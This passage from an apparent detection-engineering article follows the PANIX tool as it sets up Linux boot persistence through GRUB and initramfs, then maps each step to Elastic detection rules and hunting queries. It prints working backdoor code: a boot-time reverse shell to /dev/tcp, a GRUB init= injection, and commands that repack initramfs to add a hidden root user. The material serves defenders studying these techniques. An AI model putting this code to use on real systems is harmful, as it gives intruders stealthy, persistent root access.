<p>The GRUB module detects the Linux distribution it is running on, and determines the correct files to modify, and support tools necessary to establish persistence. There is no compatibility built into PANIX for Fedora-based operating systems within this module, due to the restricted environment available within the boot process. PANIX determines whether the payload is already injected, and if not, creates a custom configuration (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cfg</code>) file containing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init=/grub-panix.sh</code> parameter. GRUB configuration files are loaded in ascending order, based on the modules’ numeric prefix. To ensure the injected module is loaded last, the priority is set to 99.</p>
<pre><code>local grub_custom_dir=&quot;/etc/default/grub.d&quot;
local grub_custom_file=&quot;${grub_custom_dir}/99-panix.cfg&quot;

echo &quot;[*] Creating custom GRUB configuration file: $grub_custom_file&quot;
cat &lt;&lt;EOF &gt; &quot;$grub_custom_file&quot;
# Panix GRUB persistence configuration
GRUB_CMDLINE_LINUX_DEFAULT=&quot;$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh&quot;
EOF</code></pre>
<p>After this configuration file is in place, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/grub-panix.sh</code> script is created, containing a payload that sleeps for a certain amount of time (to ensure networking is available), after which it executes a reverse shell payload, detaching itself from its main process to ensure no hang ups.</p>
<pre><code>payload=&quot;( sleep 10; nohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/${ip}/${port} 0&gt;&amp;1&#x27; &amp; disown ) &amp;&quot;

local init_script=&quot;/grub-panix.sh&quot;
echo &quot;[*] Creating backdoor init script at: $init_script&quot;
cat &lt;&lt;EOF &gt; &quot;$init_script&quot;
#!/bin/bash
# Panix GRUB Persistence Backdoor (Ubuntu/Debian)
(
	echo &quot;[*] Panix backdoor payload will execute after 10 seconds delay.&quot;
	${payload}
	echo &quot;[+] Panix payload executed.&quot;
) &amp;
exec /sbin/init
EOF</code></pre>
<p>After these files are in place, all that is left is to update GRUB to contain the embedded backdoor module by running <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-grub</code>.</p>
<p>Let’s take a look at what this process looks like from a detection engineering perspective. Run the PANIX module through the following command:</p>
<pre><code>&gt; sudo ./panix.sh --grub --default --ip 192.168.1.100 --port 2014
[*] Creating backdoor init script at: /grub-panix.sh
[+] Backdoor init script created and made executable.
[*] Creating custom GRUB configuration file: /etc/default/grub.d/99-panix.cfg
[+] Custom GRUB configuration file created.
[*] Backing up /etc/default/grub to /etc/default/grub.bak...
[+] Backup created at /etc/default/grub.bak
[*] Running &#x27;update-grub&#x27; to apply changes...
Sourcing file `/etc/default/grub&#x27;
Sourcing file `/etc/default/grub.d/99-panix.cfg&#x27;
Sourcing file `/etc/default/grub.d/init-select.cfg&#x27;
Generating grub configuration file ...
[+] GRUB configuration updated. Reboot to activate the payload.</code></pre>
<p>Upon execution of the module, and rebooting the machine, the following documents can be observed in Kibana:</p>
<p></p>
<p>Upon execution of PANIX, we can see a backup of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub</code>, a new modular grub configuration, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/default/grub.d/99-panix.cfg</code>, and the backdoor payload (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/grub-panix.sh</code>) being created. After granting the backdoor the necessary execution permissions, GRUB is updated through the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-grub</code> executable, and the backdoor is now ready. Upon reboot, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/grub-panix.sh</code> is executed by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code>, which is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code> for most modern operating systems, successfully executing the reverse shell chain of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/grub-panix.sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>. The reason its <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">event.action</code> value is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">already-running</code>, is due to the payload being executed during the boot process, prior to the initialization of Elastic Defend. Depending on the boot stage of execution, Elastic Defend will be able to capture missed events with this <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">event.action</code>, allowing us to still detect the activity.</p>
<p>Let’s take a look at the coverage:</p>
<p><em>Detection and endpoint rules that cover GRUB bootloader persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_configuration_creation.toml">GRUB Configuration File Creation</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_makeconfig.toml">GRUB Configuration Generation through Built-in Utilities</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml">Boot File Copy</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_systemd_shell_execution.toml">Systemd Shell Execution During Boot</a></td></tr></tbody></table></div>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert grub

[*] Reverting GRUB persistence modifications...
[*] Restoring backup of /etc/default/grub from /etc/default/grub.bak...
[+] /etc/default/grub restored.
[*] Removing /etc/default/grub.d/99-panix.cfg...
[+] /etc/default/grub.d/99-panix.cfg removed.
[*] /grub-panix.sh not found; nothing to remove.
[*] Updating GRUB configuration...
[...]
[+] GRUB configuration updated.
[+] GRUB persistence reverted successfully.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1542---pre-os-boot-grub-bootloader" class="absolute -top-32"></span>Hunting for T1542 - Pre-OS Boot: GRUB Bootloader</h1>
<p>Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing or environmental constraints. This publication lists the available hunts for GRUB bootloader persistence; however, more details regarding the basics of threat hunting are outlined in the  “<em>Hunting for T1053 - scheduled task/job</em>” section of “<a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><em>Linux Detection Engineering -  A primer on persistence mechanisms</em></a>”. Additionally, descriptions and references can be found in our <a href="https://github.com/elastic/detection-rules">Detection Rules repository</a>, specifically in the <a href="https://github.com/elastic/detection-rules/tree/main/hunting">Linux hunting subdirectory</a>.</p>
<p>We can hunt for GRUB bootloader persistence through <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html">ES|QL</a> and <a href="https://www.elastic.co/guide/en/kibana/current/osquery.html">OSQuery</a>, focusing on file creations, modifications, and executions related to GRUB configurations. The approach includes monitoring for the following:</p>
<ol>
<li><strong>Creations and/or modifications to GRUB configuration files</strong>: Tracks changes to critical files such as the GRUB configuration file and modules, and the compiled GRUB binary. These files are essential for bootloader configurations and are commonly targeted for GRUB-based persistence.</li>
<li><strong>Execution of GRUB-related commands</strong>: Monitors for commands like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">grub-mkconfig</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">grub2-mkconfig</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-grub</code>, which may indicate attempts to modify GRUB settings or regenerate boot configurations.</li>
<li><strong>Metadata analysis of GRUB files</strong>: Identifies ownership, access times, and recent changes to GRUB configuration files to detect unauthorized modifications.</li>
<li><strong>Kernel and Boot Integrity Monitoring</strong>: Tracks critical kernel and boot-related data using ES|QL and OSQuery tables such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">secureboot</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">platform_info</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel_info</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">kernel_keys</code>, providing insights into the system’s boot integrity and kernel configurations.</li>
</ol>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_grub_bootloader.toml">Persistence via GRUB Bootloader</a> and <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml">General Kernel Manipulation</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1542/">T1542</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1542--pre-os-boot-initramfs" class="absolute -top-32"></span>T1542- Pre-OS Boot: Initramfs</h1>
<p><a href="https://wiki.debian.org/initramfs">Initramfs (Initial RAM Filesystem)</a> is a vital part of the Linux boot process, acting as a temporary root filesystem loaded into memory by the bootloader. It enables the kernel to initialize hardware, load necessary modules, and prepare the system to mount the real root filesystem.</p>
<p>As we learnt in the previous section, the bootloader (e.g., GRUB) loads two key components: the kernel (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vmlinuz</code>) and the initramfs image (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code>). The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code> is a compressed filesystem, typically stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code>, containing essential drivers, binaries (e.g. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">busybox</code>), libraries, and scripts for early system initialization. Packed in formats like gzip, LZ4, or xz, it extracts into a minimal Linux filesystem with directories like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc</code>. Once the real root filesystem is mounted, control passes to the primary <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> system (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code>), and the initramfs is discarded.</p>
<p>Initramfs plays a central role in the Linux boot process, but it doesn&#x27;t work in isolation. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code> directory houses essential files that enable the bootloader and kernel to function seamlessly. These files include the kernel binary, the initramfs image, and configuration data necessary for system initialization. Here&#x27;s a breakdown of these critical components:</p>
<ul>
<li><strong>vmlinuz-&lt;version&gt;</strong>: A compressed Linux kernel binary.</li>
<li><strong>vmlinuz</strong>: A symbolic link to the compressed Linux kernel binary.</li>
<li><strong>initrd.img-&lt;version&gt;</strong> or <strong>initramfs.img-&lt;version&gt;</strong>: The initramfs image containing the temporary filesystem.</li>
<li><strong>initrd.img</strong> or <strong>initramfs.img</strong>: A symbolic link to the initramfs image.</li>
<li><strong>config-&lt;version&gt;</strong>: Configuration options for the specific kernel version.</li>
<li><strong>System.map-&lt;version&gt;</strong>: Kernel symbol map used for debugging.</li>
<li><strong>grub/</strong>: Bootloader configuration files.</li>
</ul>
<p>Similar to GRUB, initramfs is executed early in the boot process and therefore an interesting target for attackers seeking stealthy persistence. Modifying its contents—such as adding malicious scripts or altering initialization logic—enables execution of malicious code before the system fully initializes.</p>
<p>While there is currently no specific subsection for initramfs, modification of the boot process falls under <a href="https://attack.mitre.org/techniques/T1542/">T1542</a>, <em>Pre-OS Boot</em> in the MITRE ATT&amp;CK framework.</p>
<p>The next section will explore how attackers might manipulate initramfs, the methods they could use to embed persistence mechanisms, and how to detect and mitigate these threats effectively.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1542---initramfs-manual-modifications" class="absolute -top-32"></span>T1542 - Initramfs: Manual Modifications</h1>
<p>Modifying initramfs to establish persistence is a technique discussed in the “<a href="https://breachlabs.io/initramfs-persistence-technique"><em>Initramfs Persistence Technique</em></a>” blog published on <a href="https://breachlabs.io/">Breachlabs.io</a>. At its core, modifying initramfs involves unpacking its compressed filesystem, making changes, and repacking the image to maintain functionality while embedding persistence mechanisms. This process is not inherently malicious; administrators might modify initramfs to add custom drivers or configurations. However, attackers can exploit this flexibility to execute malicious actions before the primary operating system is fully loaded.</p>
<p>An example technique involves adding code to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> script to manipulate the host filesystem—such as creating a backdoor user, altering system files/services, or injecting scripts that persist across reboots.</p>
<p>While there are helper tools for working with initramfs, manual modifications are possible through low-level utilities such as <a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Binwalk</code> is particularly useful for analyzing and extracting compressed archives, making it a good choice for inspecting and deconstructing the initramfs image.</p>
<p>In the following section, we’ll provide a detailed explanation of the manual initramfs modification process.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1542---initramfs-manual-modifications" class="absolute -top-32"></span>Persistence through T1542 - Initramfs: Manual Modifications</h1>
<p>In this section we will be “manually” manipulating initramfs to add a backdoor onto the system during the boot process. To do so, we will use the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh">setup_initramfs.sh</a> module from PANIX. Let’s analyze the most important aspects of the module to ensure we understand what is going on.</p>
<p>Upon execution of the module, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code> file is backed up, as implementing a technique like this may disrupt the boot process, and having a back up available is always recommended. Next, a temporary directory is created, and the initramfs image is copied there. Through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">binwalk</code>, we can identify and map out the different embedded archives within the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code> (such as the CPU microcode <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> archive and the gzipped <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> archive containing the mini Linux filesystem). The string <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TRAILER!!!</code> marks the end of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> archive, letting us know exactly where one archive finishes so we can separate it from the next. In other words, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">binwalk</code> shows us where to split the file, and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TRAILER!!!</code> marker confirms the boundary of the microcode <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> before we extract and rebuild the rest of the initramfs. For more detailed information, take a look at the original author’s “<a href="https://breachlabs.io/initramfs-persistence-technique"><em>Initramfs Persistence Technique</em></a>” blog.</p>
<pre><code># Use binwalk to determine the trailer address.
ADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk &#x27;{print $1}&#x27;)
if [[ -z &quot;$ADDRESS&quot; ]]; then
	echo &quot;Error: Could not determine trailer address using binwalk.&quot;
	exit 1
fi
echo &quot;[*] Trailer address: $ADDRESS&quot;</code></pre>
<p>This section extracts and unpacks parts of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code> file for modification. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dd</code> command extracts the first <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> archive (microcode) up to the byte offset marked by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TRAILER!!!</code>, saving it as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-begin</code> for later reassembly. Next, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">unmkinitramfs</code> unpacks the remaining filesystem from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img</code> into a directory (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd_extracted</code>), enabling modifications.</p>
<pre><code>dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2&gt;/dev/null || { echo &quot;Error: dd failed (begin)&quot;; exit 1; }

unmkinitramfs initrd.img initrd_extracted || { echo &quot;Error: unmkinitramfs failed&quot;; exit 1; }</code></pre>
<p>Once the filesystem is extracted, it can be modified to achieve persistence. This process focuses on manipulating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> file, which is responsible for initializing the Linux system during boot. The code performs the following:</p>
<ol>
<li>Mount the root filesystem as writable.</li>
<li>Attempt to create a new user with sudo privileges in two steps:<!-- -->
<ol>
<li>Check whether the supplied user exists already, if yes, abort.</li>
<li>If the user does not exist, add the user to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shadow</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/group</code> manually.</li>
</ol>
</li>
</ol>
<p>This payload can be altered to whatever payload is desired. As the environment in which we are working is very limited, we need to make sure to only use tools that are available.</p>
<p>After adding the correct payload, initramfs can be repacked. The script uses:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">find . | sort | cpio -R 0:0 -o -H newc | gzip &gt; ../../initrd.img-end</code></p>
<p>To repack the filesystem into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-end</code>. It ensures all files are owned by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">root:root</code> (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-R 0:0</code>) and uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">newc</code> format compatible with initramfs.</p>
<p>The previously extracted microcode archive (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-begin</code>) is concatenated with the newly created archive (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-end</code>) using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cat</code> to produce a final <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-new</code>:</p>
<p><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cat initrd.img-begin initrd.img-end &gt; initrd.img-new</code></p>
<p>The new <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initrd.img-new</code> replaces the original initramfs file, ensuring the system uses the modified version on the next boot.</p>
<p>Now that we understand the process, we can run the module and let the events unfold. Note: not all Linux distributions specify the end of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code> archive with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">TRAILER!!!</code> string, and therefore this automated technique will not work for all systems. Let’s continue!</p>
<pre><code>&gt; sudo ./panix.sh --initramfs --binwalk --username panix --password panix --snapshot yes
[*] Will inject user &#x27;panix&#x27; with hashed password &#x27;&lt;hash&gt;&#x27; into the initramfs.
[*] Preparing Binwalk-based initramfs persistence...
[*] Temporary directory: /tmp/initramfs.neg1v5
[+] Backup created: /boot/initrd.img-5.15.0-130-generic.bak
[*] Trailer address: 8057008
[+] Binwalk-based initramfs persistence applied. New initramfs installed.
[+] setup_initramfs module completed successfully.
[!] Ensure you have a recent snapshot of your system before proceeding.</code></pre>
<p>Let’s take a look at the events that are generated in Kibana:</p>
<p></p>
<p>Looking at the execution logs, we can see that <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">openssl</code> is used to generate a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">passwd</code> hash. Afterwards, the initramfs image is copied to a temporary directory, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">binwalk</code> is leveraged to find the address of the filesystem. Once the correct section is found, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">unmkinitramfs</code> is called to extract the filesystem, after which the payload is added to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init</code> file. Next, the filesystem is repacked through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gzip</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cpio</code>, and combined into a fully working initramfs image with the microcode, filesystem and other sections. This image is then copied to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code> directory, overwriting the currently active <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">initramfs</code> image. Upon reboot, the new <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix</code> user with root permissions is available.</p>
<p>Let’s take a look at the coverage:</p>
<p><em>Detection and endpoint rules that cover manual initramfs persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules_building_block/discovery_potential_memory_seeking_activity.toml">Potential Memory Seeking Activity</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_unpack_initramfs_via_unmkinitramfs.toml">Initramfs Unpacking via unmkinitramfs</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_extract_initramfs_via_cpio.toml">Initramfs Extraction via CPIO</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml">Boot File Copy</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml">OpenSSL Password Hash Generation</a></td></tr></tbody></table></div>
<p>You can revert the changes made by PANIX by running the following revert command:</p>
<pre><code>&gt; ./panix.sh --revert initramfs

[!] Restoring initramfs from backup: $initrd_backup...
[+] Initramfs restored successfully.
[!] Rebuilding initramfs to remove modifications...
[+] Initramfs rebuilt successfully.
[!] Cleaning up temporary files...
[+] Temporary files cleaned up.
[+] Initramfs persistence reverted successfully.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1542---initramfs-manual-modifications" class="absolute -top-32"></span>Hunting for T1542 - Initramfs: Manual Modifications</h1>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">binwalk</code>. This technique typically involves extracting, analyzing, and modifying initramfs files to inject malicious components or scripts into the boot process. The approach includes monitoring for the following:</p>
<ol>
<li><strong>Execution of Binwalk with Suspicious Arguments</strong>: Tracks processes where <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">binwalk</code> is executed to extract or analyze files. This can reveal attempts to inspect or tamper with initramfs contents.</li>
